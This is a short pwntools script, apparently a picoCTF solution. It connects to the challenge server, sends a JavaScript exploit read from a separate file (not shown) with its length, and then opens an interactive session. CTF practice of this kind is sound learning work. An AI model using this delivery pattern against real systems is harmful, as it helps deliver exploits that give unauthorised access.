#!/usr/bin/env python3
from pwn import *

HOST, PORT = "mercury.picoctf.net", 8758

io = remote(HOST, PORT)

data = ""
with open("exp.js", "r") as exploit:
    data = exploit.read()

io.recvuntil(b"5k:")
io.sendline(f"{len(data)}".encode())
io.recvline()
io.sendline(data.encode())
io.interactive()
